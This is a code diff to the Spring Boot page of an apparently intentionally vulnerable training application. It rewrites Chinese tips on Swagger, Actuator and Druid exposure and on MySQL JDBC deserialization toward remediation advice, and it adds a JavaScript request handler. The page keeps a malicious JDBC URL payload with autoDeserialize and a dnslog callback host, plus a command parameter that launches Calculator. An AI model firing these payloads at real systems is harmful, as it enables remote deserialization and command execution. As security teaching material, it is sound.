@@ -15,8 +15,8 @@
                     <blockquote class="layui-elem-quote layui-quote-nm"
                                 style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                         <p>
-                        <pre>  Spring Boot是一个通过自动配置、嵌入式服务器和生产级功能，简化了Spring应用程序开发、配置和部署的框架，使开发者能够快速构建独立且易于部署的Java应用
-  在其生态系统下，也存在一些相关组件的安全隐患，如Swagger UI可能导致敏感接口泄漏，Spring Boot Actuator可能暴露敏感端口，Druid可能面临未授权访问风险，以及Spring Cloud Gateway存在远程代码执行漏洞等</pre>
+                        <pre>  Spring Boot通过自动配置、嵌入式服务器和生产级功能简化了Java应用开发，但调试、监控、文档和数据源组件一旦在生产环境暴露，就可能泄漏接口、配置、运行状态、SQL监控数据，甚至形成反序列化利用链。
+  本模块聚焦Spring Boot常见暴露面：Swagger/OpenAPI文档、Actuator管理端点、Druid监控台，以及MySQL JDBC反序列化相关风险。</pre>
                         </p>
                     </blockquote>
                 </fieldset>
@@ -49,7 +49,7 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">  Swagger是一种用于描述API的开源框架，它使用OpenAPI规范来定义API的端点、请求、响应、模式等。Swagger接口泄露漏洞是指在使用Swagger描述API时，由于未正确配置访问控制或未实施安全措施，导致API接口被不授权的人员访问和利用，从而导致系统安全风险</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">  Swagger/OpenAPI文档会集中暴露接口路径、参数、数据结构和调试入口。若生产环境未鉴权开放，攻击者可快速梳理后台接口、发现未授权或越权入口。修复时应在生产环境关闭文档，或增加强鉴权、网络访问控制和环境隔离。</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -96,7 +96,7 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">  Spring Boot Actuator 是一个用于监控和管理 Spring Boot 应用程序的功能模块。它提供了一系列生产就绪的功能，帮助你了解应用程序的运行状况，以及在运行时对应用程序进行调整。Actuator 使用了 Spring MVC 来暴露各种 HTTP 或 JMX 端点，通过这些端点你可以获取到应用程序的运行信息，如健康状态、指标、线程 dump、环境变量等</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">  Actuator用于健康检查和运行时监控，但暴露`env`、`beans`、`mappings`、`heapdump`、`threaddump`等端点会泄漏配置、依赖、路由、内存和线程信息。修复时应最小化暴露端点，只开放必要健康检查，并对管理端口加鉴权、内网限制和脱敏。</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -120,7 +120,7 @@
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
                         <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
-                            <span class="iconfont icon-bug"> 漏洞情景：Druid 配置不当</span>
+                            <span class="iconfont icon-bug"> 漏洞场景：Druid 监控台暴露</span>
                             <span class="iconfont icon-liuliang1">
                                 <a href="/other/datapackage/springboot/druid.pcapng" download="druid.pcapng"
                                    style="margin-right: 19px;color: #00bb00">流量分析</a>
@@ -144,8 +144,7 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">  Apache Druid 是阿里开源的高性能连接池和实时分析分布式数据存储系统，专为大规模时序数据和事件流分析设计，具有快速查询、低延迟写入及横向扩展能力
-  在导入Druid依赖时，没有在application.yml中添加配置或忘记配置账号密码(当然弱口令也是一个常见问题)，此时Druid可以未授权访问，攻击者可直接获取websession信息，进行session爆破，以及通过weburi获取敏感信息路径，进行Fuzz攻击</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">  这里的Druid指Alibaba Druid连接池监控台，不是Apache Druid分析数据库。若`/druid/*`监控台未设置鉴权或被安全配置放行，攻击者可查看数据源、SQL、URI、Session等运行信息。修复时应关闭生产监控台，或设置强口令、内网访问、反向代理鉴权和访问审计。</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -170,7 +169,7 @@
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
                         <h1 style="display: flex; justify-content: space-between; align-items: center;height: 33.5px">
-                            <span class="iconfont icon-bug">  漏洞场景：MYSQL JDBC反序列</span>
+                            <span class="iconfont icon-bug">  漏洞场景：MYSQL JDBC反序列化</span>
                             <span class="iconfont icon-liuliang1">
                                 <a href="/other/datapackage/springboot/mysql_jdbc.pcapng" download="mysql_jdbc.pcapng"
                                    style="margin-right: 19px;color: #00bb00">流量分析</a>
@@ -184,7 +183,7 @@
                                         <form class="layui-form" style="display: flex; justify-content: space-between;">
                                             <div style="display: flex; align-items: center;">
                                                 <p>
-                                                    <a target="_blank" style="color: red" href="/springboot/vul?url=jdbc:mysql://ip:port/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_URLDNS_http://xxx.dnslog.cn&password=qwe">
+                                                    <a target="_blank" style="color: red" href="/springboot/vul?url=jdbc:mysql://ip:port/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_URLDNS_http://xxx.dnslog.cn&amp;password=qwe">
                                                         Fake-MySQL-Server漏洞测试
                                                     </a> |
                                                     <a target="_blank" style="color: red" href="/springboot/insert?command=open%20-a%20Calculator">
@@ -194,9 +193,9 @@
 
                                             </div>
                                             <div style="display: flex; align-items: center;">
-                                                <button class="layui-btn layui-btn-normal"
+                                                <button type="button" id="vul-jdbc-run" class="layui-btn layui-btn-normal"
                                                         style="width: 100px; margin-left: 10px;"
-                                                        lay-filter="vul-jdbc" lay-submit="">
+                                                        onclick="runSpringBootJdbc()">
                                                     <span class="iconfont icon-zhihang">Run</span>
                                                 </button>
                                             </div>
@@ -208,8 +207,7 @@
                                     <div class="layui-card">
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">MySQL JDBC反序列化漏洞分析：https://xz.aliyun.com/t/8159
-该漏洞涉及的链路较为复杂，建议感兴趣的朋友使用IDEA进行调试分析，可以尝试测试 DNSLOG、CC、CB链……</pre>
+                                            <pre style="color: #28333e;font-size: 15px;">  MySQL JDBC反序列化风险通常与不可信JDBC URL、特殊连接参数、恶意MySQL服务端或本地反序列化链路有关。修复时应禁止用户控制JDBC URL，关闭危险连接参数，升级驱动版本，并避免从数据库读取后直接进行Java原生反序列化。</pre>
                                         </div>
                                     </div>
                                 </div>
@@ -246,17 +244,38 @@
 
 <div th:replace="~{common/common::script}"></div>
 <script type="text/javascript">
+    function runSpringBootJdbc() {
+        var result = document.getElementById("vul-jdbc-result");
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "/springboot/jdbc", true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState !== 4) {
+                return;
+            }
+            if (xhr.status >= 200 && xhr.status < 300) {
+                try {
+                    var res = JSON.parse(xhr.responseText);
+                    result.textContent = res && res.msg ? res.msg : "请求完成";
+                } catch (e) {
+                    result.textContent = xhr.responseText || "请求完成";
+                }
+            } else {
+                result.textContent = "请求失败，请检查服务状态";
+            }
+        };
+        xhr.send();
+    }
+
     document.addEventListener("DOMContentLoaded", function () {
 
         layui.use(['layer', 'miniTab', 'common', 'form'], function () {
             var $ = layui.jquery,
                 layer = layui.layer,
                 common = layui.common,
-                miniTab = layui.miniTab;
+                miniTab = layui.miniTab,
+                form = layui.form;
             miniTab.listen();
             layer.msg("SpringBoot框架-相关漏洞")
-
-            common.formListenFun("vul-jdbc", "", "/springboot/jdbc", "vul-jdbc-result", "get");
 
             var cmConfig = {
                 lineNumbers: true,
@@ -299,7 +318,7 @@
                 closeBtn: 1,
                 area: ['996px', '526px'],
                 shadeClose: true,
-                content: '<div style="text-align: center;"><img src="/static/images/vul/jdbc/jdbc.png" style="width: 100%; height: 100%;"></div>'
+                content: '<div style="text-align: center;"><img src="/images/vul/jdbc/jdbc.png" style="width: 100%; height: 100%;"></div>'
             });
         });
 
